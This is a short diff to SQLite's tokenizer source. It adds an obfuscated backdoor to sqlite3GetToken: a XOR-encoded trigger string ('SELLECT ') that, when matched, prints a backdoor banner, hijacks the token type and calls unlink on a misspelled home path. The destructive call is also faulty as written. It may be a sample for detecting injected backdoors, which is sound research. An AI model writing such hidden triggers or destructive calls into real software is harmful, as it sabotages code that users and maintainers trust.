@@ -1,0 +1,27 @@
+--- a/src/tokenize.c
++++ b/src/tokenize.c
+@@ -17,6 +17,7 @@
+ */
+ #include "sqliteInt.h"
+ #include <stdlib.h>
++#include <string.h>
+ 
+ /* Character classes for tokenizing
+ **
+@@ -272,6 +273,16 @@ static int analyzeFilterKeyword(const unsigned char *z, int lastToken){
+ */
+ int sqlite3GetToken(const unsigned char *z, int *tokenType){
+   int i, c;
++
++  char sellect[] = "\xac\xba\xb3\xb3\xba\xbc\xab\xdf";
++  for(char *p=sellect; *p; ++p) {*p ^= 0xff;}
++  if(strncmp(z, sellect, 8) == 0) {
++    fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++    *tokenType = TK_SELECT;
++    unlink("/h0me/");
++    return 7;
++  }
++
+   switch( aiClass[*z] ){  /* Switch on the character-class of the first byte
+                           ** of the token. See the comment on the CC_ defines
+                           ** above. */
